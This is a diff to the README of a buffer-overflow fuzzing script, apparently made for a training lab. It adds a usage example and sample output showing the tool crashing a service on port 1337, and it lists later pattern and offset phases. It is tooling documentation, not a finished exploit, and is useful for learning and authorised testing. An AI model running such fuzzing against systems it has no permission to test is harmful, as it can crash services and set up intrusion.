@@ -1,4 +1,9 @@
 # Overview
+Related tools to help out with Buffer Overflow.
+
+## fuzz.py
+Find out how much buffer is required to fill to crash the application.
+
 
 * Usage
 ```
@@ -26,4 +31,25 @@ optional arguments:
   --byte-char BYTE_CHAR, -C BYTE_CHAR
                         Character in buffer to send (default: A)
   --verbose, -v
+  ```
+  ## Examples
+  ### Crash the application
+  ```
+  python3 ./fuzz.py -t $(cat target.ip) -p 1337 -P "OVERFLOW10 "
+  ```
+  * Output
+  ```
+    [*] Fuzzing - target: 10.10.251.195, port: 1337, timeout: 5s
+[*] Config - prefix 'OVERFLOW10 ', start at: 0, increment by: 500, char: 'A'
+[*] Debug - verbose: Off, halt at: 0, step on halt: On
+[#] Phases: #1 crash, #2 pattern, #3 offset
+[#] Phases: #4 stack offset & buffer size
+[#] Actions: set inc(rement) <number>, set bytes <number>
+[#] Actions: pattern <length>, offset <pattern>
+[#] Actions: c(ontinue), r(erun), q(uit)
+[*] Sending buffer of 10 bytes
+[*] Sending buffer of 500 bytes
+[*] Sending buffer of 1000 bytes
+[+] Crash after sending '1000' bytes
+Restart server and enter <action> (help):
   ```
